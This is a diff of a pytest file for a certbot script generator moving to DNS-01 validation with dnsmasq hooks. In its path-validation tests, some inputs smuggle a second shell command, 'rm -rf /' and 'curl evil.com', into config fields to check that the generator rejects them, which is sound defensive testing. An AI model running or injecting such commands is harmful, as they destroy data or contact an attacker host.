@@ -1,4 +1,6 @@
-"""Tests for the Let's Encrypt certbot generator."""
+"""Tests for the Let's Encrypt certbot generator (DNS-01 validation)."""
+
+import pytest
 
 from gdoc2netcfg.derivations.dns_names import derive_all_dns_names
 from gdoc2netcfg.derivations.hardware import (
@@ -60,12 +62,95 @@ def _make_inventory(*hosts):
     return NetworkInventory(site=SITE, hosts=list(hosts))
 
 
-class TestLetsEncryptGenerator:
+class TestHookScripts:
+    def test_auth_hook_generated(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        assert "hooks/dnsmasq-dns01-auth" in files
+
+    def test_cleanup_hook_generated(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        assert "hooks/dnsmasq-dns01-cleanup" in files
+
+    def test_auth_hook_is_shell(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        assert files["hooks/dnsmasq-dns01-auth"].startswith("#!/bin/sh\n")
+
+    def test_cleanup_hook_is_shell(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        assert files["hooks/dnsmasq-dns01-cleanup"].startswith("#!/bin/sh\n")
+
+    def test_auth_hook_writes_txt_record(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        script = files["hooks/dnsmasq-dns01-auth"]
+        assert "txt-record=_acme-challenge" in script
+        assert "CERTBOT_DOMAIN" in script
+        assert "CERTBOT_VALIDATION" in script
+
+    def test_cleanup_hook_removes_txt_record(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        script = files["hooks/dnsmasq-dns01-cleanup"]
+        assert "sed -i" in script
+        assert "acme-challenge.conf" in script
+
+    def test_auth_hook_reloads_dnsmasq(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        script = files["hooks/dnsmasq-dns01-auth"]
+        assert "systemctl reload dnsmasq@external" in script
+
+    def test_cleanup_hook_reloads_dnsmasq(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        script = files["hooks/dnsmasq-dns01-cleanup"]
+        assert "systemctl reload dnsmasq@external" in script
+
+    def test_custom_dnsmasq_conf_dir_in_hooks(self):
+        host = _make_host()
+        files = generate_letsencrypt(
+            _make_inventory(host),
+            dnsmasq_conf_dir="/opt/dnsmasq/external",
+        )
+        auth = files["hooks/dnsmasq-dns01-auth"]
+        cleanup = files["hooks/dnsmasq-dns01-cleanup"]
+        assert "/opt/dnsmasq/external" in auth
+        assert "/opt/dnsmasq/external" in cleanup
+
+    def test_custom_dnsmasq_service_in_hooks(self):
+        host = _make_host()
+        files = generate_letsencrypt(
+            _make_inventory(host),
+            dnsmasq_service="dnsmasq@custom",
+        )
+        auth = files["hooks/dnsmasq-dns01-auth"]
+        cleanup = files["hooks/dnsmasq-dns01-cleanup"]
+        assert "systemctl reload dnsmasq@custom" in auth
+        assert "systemctl reload dnsmasq@custom" in cleanup
+
+    def test_auth_hook_appends_to_conf_file(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        script = files["hooks/dnsmasq-dns01-auth"]
+        assert ">>" in script
+        assert "acme-challenge.conf" in script
+
+    def test_auth_hook_sleeps_after_reload(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+        script = files["hooks/dnsmasq-dns01-auth"]
+        assert "sleep" in script
+
+
+class TestCertScripts:
     def test_single_host_produces_cert_script(self):
         host = _make_host()
         files = generate_letsencrypt(_make_inventory(host))
 
-        # Should have certs-available/{fqdn} + renew-enabled.sh
         cert_key = "certs-available/desktop.welland.mithis.com"
         assert cert_key in files
         assert "renew-enabled.sh" in files
@@ -77,12 +162,30 @@ class TestLetsEncryptGenerator:
         script = files["certs-available/desktop.welland.mithis.com"]
         assert script.startswith("#!/bin/sh\n")
 
-    def test_cert_script_has_certbot_command(self):
+    def test_cert_script_uses_manual_dns(self):
         host = _make_host()
         files = generate_letsencrypt(_make_inventory(host))
 
         script = files["certs-available/desktop.welland.mithis.com"]
-        assert "certbot certonly --webroot" in script
+        assert "certbot certonly --manual" in script
+        assert "--preferred-challenges dns" in script
+
+    def test_cert_script_no_webroot(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+
+        script = files["certs-available/desktop.welland.mithis.com"]
+        assert "--webroot" not in script
+        assert "-w " not in script
+
+    def test_cert_script_references_hooks_relative(self):
+        host = _make_host()
+        files = generate_letsencrypt(_make_inventory(host))
+
+        script = files["certs-available/desktop.welland.mithis.com"]
+        assert 'HOOKS_DIR="$(cd "$(dirname "$0")/../hooks" && pwd)"' in script
+        assert '--manual-auth-hook "$HOOKS_DIR/dnsmasq-dns01-auth"' in script
+        assert '--manual-cleanup-hook "$HOOKS_DIR/dnsmasq-dns01-cleanup"' in script
 
     def test_cert_name_is_primary_fqdn(self):
         host = _make_host()
@@ -96,7 +199,6 @@ class TestLetsEncryptGenerator:
         files = generate_letsencrypt(_make_inventory(host))
 
         script = files["certs-available/desktop.welland.mithis.com"]
-        # FQDNs should be present
         assert "-d desktop.welland.mithis.com" in script
         assert "-d desktop.int.welland.mithis.com" in script
         # Short name should NOT appear as -d
@@ -109,16 +211,6 @@ class TestLetsEncryptGenerator:
         script = files["certs-available/desktop.welland.mithis.com"]
         assert "-d ipv4.desktop.welland.mithis.com" in script
         assert "-d ipv6.desktop.welland.mithis.com" in script
-
-    def test_custom_acme_webroot(self):
-        host = _make_host()
-        files = generate_letsencrypt(
-            _make_inventory(host),
-            acme_webroot="/srv/acme",
-        )
-
-        script = files["certs-available/desktop.welland.mithis.com"]
-        assert "-w /srv/acme" in script
 
     def test_renew_script(self):
         host = _make_host()
@@ -146,9 +238,12 @@ class TestLetsEncryptGenerator:
         # No dns_names set → no FQDNs
         files = generate_letsencrypt(_make_inventory(host))
 
-        # Only renew-enabled.sh, no cert scripts
-        assert len(files) == 1
+        # hooks + renew-enabled.sh, but no cert scripts
+        cert_files = [k for k in files if k.startswith("certs-available/")]
+        assert len(cert_files) == 0
         assert "renew-enabled.sh" in files
+        assert "hooks/dnsmasq-dns01-auth" in files
+        assert "hooks/dnsmasq-dns01-cleanup" in files
 
 
 class TestDeployHooks:
@@ -185,24 +280,62 @@ class TestDeployHooks:
         script = files["certs-available/desktop.welland.mithis.com"]
         assert "--deploy-hook" not in script
 
+    def test_deploy_hook_coexists_with_dns_hooks(self):
+        host = _make_host(
+            hostname="bmc.big-storage",
+            ip="10.1.10.50",
+            hardware_type=HARDWARE_SUPERMICRO_BMC,
+        )
+        files = generate_letsencrypt(_make_inventory(host))
+
+        cert_key = next(k for k in files if k.startswith("certs-available/"))
+        script = files[cert_key]
+        # Both DNS-01 hooks and deploy hook present
+        assert "--manual-auth-hook" in script
+        assert "--manual-cleanup-hook" in script
+        assert "--deploy-hook" in script
+
     def test_multiple_hosts(self):
         h1 = _make_host(hostname="desktop", ip="10.1.10.100")
         h2 = _make_host(hostname="server", ip="10.1.10.200")
         files = generate_letsencrypt(_make_inventory(h1, h2))
 
-        # 2 cert scripts + 1 renew
+        # 2 cert scripts + 1 renew + 2 hooks
         cert_files = [k for k in files if k.startswith("certs-available/")]
         assert len(cert_files) == 2
         assert "renew-enabled.sh" in files
+        assert "hooks/dnsmasq-dns01-auth" in files
 
 
 class TestPathValidation:
-    def test_rejects_malicious_acme_webroot(self):
-        import pytest
-
+    def test_rejects_malicious_dnsmasq_conf_dir(self):
         host = _make_host()
-        with pytest.raises(ValueError, match="Unsafe acme_webroot"):
+        with pytest.raises(ValueError, match="Unsafe dnsmasq_conf_dir"):
             generate_letsencrypt(
                 _make_inventory(host),
-                acme_webroot="/var/www; rm -rf /",
+                dnsmasq_conf_dir="/etc/dnsmasq; rm -rf /",
             )
+
+    def test_rejects_malicious_dnsmasq_service(self):
+        host = _make_host()
+        with pytest.raises(ValueError, match="Unsafe dnsmasq_service"):
+            generate_letsencrypt(
+                _make_inventory(host),
+                dnsmasq_service="dnsmasq; curl evil.com",
+            )
+
+    def test_accepts_valid_dnsmasq_conf_dir(self):
+        host = _make_host()
+        files = generate_letsencrypt(
+            _make_inventory(host),
+            dnsmasq_conf_dir="/opt/dnsmasq/external",
+        )
+        assert "hooks/dnsmasq-dns01-auth" in files
+
+    def test_accepts_valid_dnsmasq_service(self):
+        host = _make_host()
+        files = generate_letsencrypt(
+            _make_inventory(host),
+            dnsmasq_service="dnsmasq@external",
+        )
+        assert "hooks/dnsmasq-dns01-auth" in files
